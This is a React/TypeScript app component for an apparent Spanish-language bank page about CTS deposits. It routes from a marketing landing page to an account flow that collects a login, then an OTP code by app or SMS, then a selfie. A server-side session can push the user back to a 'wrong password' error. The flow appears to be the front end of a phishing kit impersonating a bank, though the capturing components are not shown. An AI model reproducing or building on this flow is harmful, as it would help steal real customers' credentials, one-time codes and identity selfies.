import { useEffect, useState } from 'react'
import { ApplyModal } from './components/ApplyModal'
import { Documents } from './components/Documents'
import { Employers } from './components/Employers'
import { FAQ } from './components/FAQ'
import { Footer } from './components/Footer'
import { Header } from './components/Header'
import { Hero } from './components/Hero'
import { LoginPage } from './components/LoginPage'
import { OtpPage } from './components/OtpPage'
import { Related } from './components/Related'
import { SelfiePage } from './components/SelfiePage'
import { Simulator } from './components/Simulator'
import { WhyCts } from './components/WhyCts'

type ModalMode = 'cts' | 'card' | null

function currentPath() {
  return window.location.pathname.replace(/\/+$/, '') || '/'
}

export default function App() {
  const [path, setPath] = useState(currentPath)
  const [modal, setModal] = useState<ModalMode>(null)
  const [otpState, setOtpState] = useState<{ sessionId: string; mode: 'dinamica' | 'sms' } | null>(null)
  const [showSelfie, setShowSelfie] = useState(false)
  const [loginError, setLoginError] = useState('')

  const go = (next: string) => {
    window.history.pushState({}, '', next)
    setPath(next)
    window.scrollTo(0, 0)
  }

  useEffect(() => {
    const onPop = () => {
      setPath(currentPath())
    }
    window.addEventListener('popstate', onPop)
    return () => window.removeEventListener('popstate', onPop)
  }, [])

  if (path === '/cuenta') {
    if (showSelfie) {
      return (
        <SelfiePage
          onHome={() => {
            setShowSelfie(false)
            setOtpState(null)
            go('/')
          }}
        />
      )
    }

    if (otpState) {
      return (
        <OtpPage
          sessionId={otpState.sessionId}
          initialMode={otpState.mode}
          onHome={() => {
            setOtpState(null)
            go('/')
          }}
          onSuccess={() => {
            setShowSelfie(true)
            setOtpState(null)
          }}
          onErrorLogin={() => {
            setLoginError('Usuario o clave digital incorrecta. Por favor, verifica tus datos.')
            setOtpState(null)
          }}
        />
      )
    }

    return (
      <LoginPage
        onHome={() => go('/')}
        initialError={loginError}
        onOtpRequired={(sessionId, mode) => {
          setLoginError('')
          setOtpState({ sessionId, mode })
        }}
        onSuccess={() => {
          setShowSelfie(true)
        }}
      />
    )
  }

  return (
    <>
      <Header
        onSolicita={() => setModal('card')}
        onCuenta={() => {
          setLoginError('')
          setOtpState(null)
          setShowSelfie(false)
          go('/cuenta')
        }}
      />
      <main>
        <Hero onWant={() => setModal('cts')} />
        <WhyCts />
        <Simulator />
        <Documents />
        <Employers />
        <FAQ />
        <Related />
      </main>
      <Footer />
      {modal ? <ApplyModal mode={modal} onClose={() => setModal(null)} /> : null}
    </>
  )
}
